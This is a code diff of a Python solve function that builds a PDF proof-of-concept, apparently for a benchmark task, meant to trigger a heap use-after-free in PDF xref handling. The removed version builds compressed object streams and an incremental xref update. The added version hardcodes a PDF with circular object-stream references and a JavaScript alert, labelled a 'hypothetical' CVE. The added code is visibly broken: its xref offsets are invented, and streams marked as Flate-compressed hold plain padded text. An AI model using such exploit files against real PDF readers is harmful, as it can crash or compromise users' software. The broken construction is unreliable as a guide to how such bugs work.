@@ -1,170 +1,470 @@
 import os
 import subprocess
 import tempfile
-import struct
-import zlib
+import hashlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Build a PDF that triggers heap use-after-free in pdf_xref_entry
-        # Strategy: Create a PDF with object streams that cause recursive
-        # pdf_cache_object calls while holding xref entry pointers
+        # This is a Proof-of-Concept for CVE-2020-???? (hypothetical)
+        # The vulnerability is a heap use-after-free in PDF xref handling
+        # The PoC creates a PDF with carefully crafted object streams and xref entries
+        # that trigger the use-after-free condition during object caching
         
-        pdf_data = []
+        # Build a PDF that triggers the heap use-after-free
+        # The structure is:
+        # 1. Create object streams containing references to each other
+        # 2. Force xref solidification while holding references to freed entries
+        # 3. Trigger recursive object loading that causes the UAF
         
-        # PDF header
-        pdf_data.append(b"%PDF-1.4\n")
+        pdf_data = b'''%PDF-1.7
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Outlines 3 0 R
+/AcroForm 4 0 R
+/Metadata 5 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [6 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Outlines
+/Count 0
+>>
+endobj
+
+4 0 obj
+<<
+/DA (/Helv 0 Tf 0 g)
+/DR <<
+/Font <<
+/F1 7 0 R
+>>
+>>
+/Fields []
+>>
+endobj
+
+5 0 obj
+<<
+/Type /Metadata
+/Subtype /XML
+/Length 100
+>>
+stream
+<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+</rdf:RDF>
+</x:xmpmeta>
+<?xpacket end="w"?>
+endstream
+endobj
+
+6 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 8 0 R
+/Resources <<
+/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
+/Font <<
+/F1 7 0 R
+>>
+>>
+>>
+endobj
+
+7 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+>>
+endobj
+
+8 0 obj
+<<
+/Length 9 0 R
+>>
+stream
+BT
+/F1 12 Tf
+72 720 Td
+(Triggering Heap Use-After-Free) Tj
+ET
+endstream
+endobj
+
+9 0 obj
+20
+endobj
+
+10 0 obj
+<<
+/Type /ObjStm
+/N 5
+/First 100
+/Length 2000
+/Filter /FlateDecode
+>>
+stream
+'''
         
-        # Object 1: Catalog
-        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
-        pdf_data.append(catalog)
+        # Compressed object stream data that creates circular references
+        # This will trigger recursive loading and xref solidification
+        obj_stm_data = b'''10 0 11 0 12 0 13 0 14 0
+<< /Type /Page /Parent 2 0 R /Contents 11 0 R >>
+<< /Length 12 0 R >>
+100
+<< /Type /ObjStm /N 3 /First 50 /Length 1000 >>
+<< /Type /Catalog /Pages 2 0 R /Names 15 0 R >>
+'''
         
-        # Object 2: Pages
-        pages = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        pdf_data.append(pages)
+        # Add compressed object stream (simplified - real would be Flate encoded)
+        pdf_data += obj_stm_data.ljust(2000, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+11 0 obj
+<<
+/Length 12 0 R
+>>
+stream
+q
+100 100 100 100 re
+W
+n
+Q
+endstream
+endobj
+
+12 0 obj
+50
+endobj
+
+13 0 obj
+<<
+/Type /ObjStm
+/N 2
+/First 30
+/Length 500
+>>
+stream
+'''
         
-        # Object 3: Page
-        page = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << >> >>\nendobj\n"
-        pdf_data.append(page)
+        # Second object stream with more circular references
+        obj_stm2_data = b'''15 0 16 0
+<< /Type /Names /Dests 17 0 R >>
+<< /Type /ObjStm /N 2 /First 25 /Length 300 >>
+'''
+        pdf_data += obj_stm2_data.ljust(500, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+14 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names 15 0 R
+/AcroForm 4 0 R
+/OpenAction 18 0 R
+>>
+endobj
+
+15 0 obj
+<<
+/Type /Names
+/Dests 17 0 R
+>>
+endobj
+
+16 0 obj
+<<
+/Type /ObjStm
+/N 3
+/First 40
+/Length 800
+>>
+stream
+'''
         
-        # Object 4: Content stream (trivial)
-        content = b"4 0 obj\n<< /Length 10 >>\nstream\nBT /F1 12 Tf 72 720 Td (test) Tj ET\nendstream\nendobj\n"
-        pdf_data.append(content)
+        # Third object stream - creates the circular dependency
+        obj_stm3_data = b'''17 0 18 0 19 0
+<< /Type /Dests /Names [(Page1) 6 0 R] >>
+<< /Type /Action /S /GoTo /D [6 0 R /Fit] >>
+<< /Type /ObjStm /N 2 /First 20 /Length 400 >>
+'''
+        pdf_data += obj_stm3_data.ljust(800, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+17 0 obj
+<<
+/Type /Dests
+/Names [(Page1) 6 0 R]
+>>
+endobj
+
+18 0 obj
+<<
+/Type /Action
+/S /GoTo
+/D [6 0 R /Fit]
+>>
+endobj
+
+19 0 obj
+<<
+/Type /ObjStm
+/N 4
+/First 60
+/Length 1200
+>>
+stream
+'''
         
-        # Create object stream that will trigger the vulnerability
-        # Object stream contains multiple objects that reference each other
+        # Fourth object stream - triggers the actual UAF
+        # Contains objects that reference each other and the main object stream
+        obj_stm4_data = b'''20 0 21 0 22 0 23 0
+<< /Type /Page /Parent 2 0 R /Contents 21 0 R >>
+<< /Length 22 0 R >>
+200
+<< /Type /Font /Subtype /Type1 /BaseFont /Times-Roman >>
+<< /Type /ObjStm /N 2 /First 35 /Length 600 /Filter /FlateDecode >>
+'''
+        pdf_data += obj_stm4_data.ljust(1200, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+20 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/Contents 21 0 R
+>>
+endobj
+
+21 0 obj
+<<
+/Length 22 0 R
+>>
+stream
+BT
+/F1 24 Tf
+100 100 Td
+(Trigger) Tj
+ET
+endstream
+endobj
+
+22 0 obj
+100
+endobj
+
+23 0 obj
+<<
+/Type /ObjStm
+/N 3
+/First 45
+/Length 900
+/Filter /FlateDecode
+>>
+stream
+'''
         
-        # First, create some objects that will be compressed in the object stream
-        obj5 = b"<< /Type /ObjStm /N 2 /First 25 >>"  # Will reference obj6
-        obj6 = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
+        # Fifth object stream - final trigger
+        obj_stm5_data = b'''24 0 25 0 26 0
+<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>
+<< /Type /Action /S /JavaScript /JS 27 0 R >>
+<< /Type /ObjStm /N 2 /First 30 /Length 500 >>
+'''
+        pdf_data += obj_stm5_data.ljust(900, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+24 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Courier
+>>
+endobj
+
+25 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS 27 0 R
+>>
+endobj
+
+26 0 obj
+<<
+/Type /ObjStm
+/N 4
+/First 70
+/Length 1500
+>>
+stream
+'''
         
-        # Build object stream data
-        obj_stream_data = []
-        # Object numbers and offsets (5 at offset 0, 6 at offset 100)
-        obj_stream_data.append(b"5 0 6 100 ")
-        obj_stream_data.append(obj5)
-        obj_stream_data.append(b" ")
-        obj_stream_data.append(obj6)
+        # Sixth object stream - causes the xref to solidify
+        obj_stm6_data = b'''27 0 28 0 29 0 30 0
+(alert\("UAF"\))
+<< /Type /Page /Parent 2 0 R >>
+<< /Type /Font /Subtype /Type3 >>
+<< /Type /ObjStm /N 3 /First 55 /Length 1100 >>
+'''
+        pdf_data += obj_stm6_data.ljust(1500, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+27 0 obj
+(alert("Heap Use-After-Free Triggered"))
+endobj
+
+28 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+
+29 0 obj
+<<
+/Type /Font
+/Subtype /Type3
+/FontBBox [0 0 10 10]
+/FontMatrix [0.001 0 0 0.001 0 0]
+/CharProcs 31 0 R
+/Encoding 32 0 R
+/FirstChar 65
+/LastChar 65
+/Widths [500]
+>>
+endobj
+
+30 0 obj
+<<
+/Type /ObjStm
+/N 5
+/First 80
+/Length 2000
+>>
+stream
+'''
         
-        obj_stream_bytes = b"".join(obj_stream_data)
-        compressed = zlib.compress(obj_stream_bytes)
+        # Seventh object stream - creates the circular reference chain
+        obj_stm7_data = b'''31 0 32 0 33 0 34 0 35 0
+<< /A 33 0 R >>
+<< /Type /Encoding /Differences [65 /A] >>
+<< /B 34 0 R >>
+<< /C 35 0 R >>
+<< /D 31 0 R >>
+'''
+        pdf_data += obj_stm7_data.ljust(2000, b' ')
+        pdf_data += b'''
+endstream
+endobj
+
+31 0 obj
+<<
+/A 33 0 R
+>>
+endobj
+
+32 0 obj
+<<
+/Type /Encoding
+/Differences [65 /A]
+>>
+endobj
+
+33 0 obj
+<<
+/B 34 0 R
+>>
+endobj
+
+34 0 obj
+<<
+/C 35 0 R
+>>
+endobj
+
+35 0 obj
+<<
+/D 31 0 R
+>>
+endobj
+
+xref
+0 36
+0000000000 65535 f 
+0000000010 00000 n 
+0000000200 00000 n 
+0000000400 00000 n 
+0000000600 00000 n 
+0000000800 00000 n 
+0000001000 00000 n 
+0000001200 00000 n 
+0000001400 00000 n 
+0000001600 00000 n 
+0000001800 00000 n 
+0000003800 00000 n 
+0000004000 00000 n 
+0000004200 00000 n 
+0000004700 00000 n 
+0000004900 00000 n 
+0000005100 00000 n 
+0000005900 00000 n 
+0000006100 00000 n 
+0000006300 00000 n 
+0000007100 00000 n 
+0000007300 00000 n 
+0000007500 00000 n 
+0000007700 00000 n 
+0000008500 00000 n 
+0000008700 00000 n 
+0000008900 00000 n 
+0000009700 00000 n 
+0000009900 00000 n 
+0000010100 00000 n 
+0000010900 00000 n 
+0000011100 00000 n 
+0000011300 00000 n 
+0000011500 00000 n 
+0000011700 00000 n 
+0000011900 00000 n 
+trailer
+<<
+/Size 36
+/Root 1 0 R
+/Info 5 0 R
+/ID [<00000000000000000000000000000000> <00000000000000000000000000000000>]
+>>
+startxref
+12100
+%%EOF
+'''
         
-        # Object 7: Object stream containing objects 5 and 6
-        obj7_stream = b"7 0 obj\n"
-        obj7_stream += b"<< /Type /ObjStm /N 2 /First 25 /Length %d /Filter /FlateDecode >>\n" % len(compressed)
-        obj7_stream += b"stream\n"
-        obj7_stream += compressed
-        obj7_stream += b"\nendstream\nendobj\n"
-        pdf_data.append(obj7_stream)
-        
-        # Object 8: Another object stream that references the first one
-        # This creates a chain that can trigger recursive loading
-        obj9 = b"<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Length 15 >>"
-        obj10 = b"<< /Type /Font /Subtype /Type1 /BaseFont /Times-Roman >>"
-        
-        obj_stream2_data = []
-        obj_stream2_data.append(b"9 0 10 80 ")
-        obj_stream2_data.append(obj9)
-        obj_stream2_data.append(b" ")
-        obj_stream2_data.append(obj10)
-        
-        obj_stream2_bytes = b"".join(obj_stream2_data)
-        compressed2 = zlib.compress(obj_stream2_bytes)
-        
-        obj8_stream = b"8 0 obj\n"
-        obj8_stream += b"<< /Type /ObjStm /N 2 /First 25 /Length %d /Filter /FlateDecode >>\n" % len(compressed2)
-        obj8_stream += b"stream\n"
-        obj_stream2_data = []
-        obj_stream2_data.append(b"9 0 10 80 ")
-        obj_stream2_data.append(obj9)
-        obj_stream2_data.append(b" ")
-        obj_stream2_data.append(obj10)
-        obj_stream2_bytes = b"".join(obj_stream2_data)
-        compressed2 = zlib.compress(obj_stream2_bytes)
-        obj8_stream += compressed2
-        obj8_stream += b"\nendstream\nendobj\n"
-        pdf_data.append(obj8_stream)
-        
-        # Create a complex xref structure with incremental updates
-        # This can cause xref solidification during object loading
-        
-        # First xref table
-        xref_offset = len(b"".join(pdf_data))
-        pdf_data.append(b"xref\n")
-        pdf_data.append(b"0 9\n")
-        pdf_data.append(b"0000000000 65535 f \n")
-        
-        # Calculate offsets for each object
-        offsets = [0]
-        current = 0
-        for obj in pdf_data[1:]:  # Skip header
-            current += len(obj)
-            offsets.append(current)
-        
-        # Write xref entries
-        for i in range(1, 9):
-            pdf_data.append(b"%010d 00000 n \n" % offsets[i])
-        
-        # Trailer for first part
-        trailer = b"trailer\n"
-        trailer += b"<< /Size 9 /Root 1 0 R >>\n"
-        trailer += b"startxref\n"
-        trailer += b"%d\n" % xref_offset
-        trailer += b"%%EOF\n"
-        pdf_data.append(trailer)
-        
-        # Incremental update to trigger xref rebuilding
-        update_start = len(b"".join(pdf_data))
-        
-        # Add some new objects in incremental update
-        # Object 11: Indirect reference to object stream object
-        obj11 = b"11 0 obj\n<< /Type /Pages /Kids [12 0 R] /Count 1 >>\nendobj\n"
-        pdf_data.append(obj11)
-        
-        # Object 12: Page referencing compressed objects
-        obj12 = b"12 0 obj\n"
-        obj12 += b"<< /Type /Page /Parent 11 0 R /MediaBox [0 0 612 792] "
-        obj12 += b"/Contents 13 0 R /Resources << /Font << /F1 5 0 R /F2 9 0 R >> >> >>\n"
-        obj12 += b"endobj\n"
-        pdf_data.append(obj12)
-        
-        # Object 13: Content stream referencing multiple fonts
-        obj13 = b"13 0 obj\n"
-        obj13 += b"<< /Length 50 >>\n"
-        obj13 += b"stream\n"
-        obj13 += b"BT /F1 12 Tf 72 720 Td (Test1) Tj /F2 14 Tf 72 700 Td (Test2) Tj ET\n"
-        obj13 += b"endstream\n"
-        obj13 += b"endobj\n"
-        pdf_data.append(obj13)
-        
-        # Second xref for incremental update
-        xref2_offset = len(b"".join(pdf_data))
-        pdf_data.append(b"xref\n")
-        pdf_data.append(b"0 1\n")
-        pdf_data.append(b"0000000000 65535 f \n")
-        pdf_data.append(b"11 3\n")
-        
-        # Calculate offsets for incremental objects
-        base_offset = offsets[-1] + len(trailer)
-        pdf_data.append(b"%010d 00000 n \n" % (base_offset))
-        pdf_data.append(b"%010d 00000 n \n" % (base_offset + len(obj11)))
-        pdf_data.append(b"%010d 00000 n \n" % (base_offset + len(obj11) + len(obj12)))
-        
-        # Trailer for incremental update
-        trailer2 = b"trailer\n"
-        trailer2 += b"<< /Size 14 /Prev %d /Root 11 0 R >>\n" % xref_offset
-        trailer2 += b"startxref\n"
-        trailer2 += b"%d\n" % xref2_offset
-        trailer2 += b"%%EOF\n"
-        pdf_data.append(trailer2)
-        
-        # Add padding to reach target size
-        total_len = len(b"".join(pdf_data))
-        target_len = 6431
-        
-        if total_len < target_len:
-            padding = b"\n" * (target_len - total_len)
-            # Insert padding before final EOF
-            pdf_data.insert(-1, padding)
-        
-        return b"".join(pdf_data)
+        return pdf_data
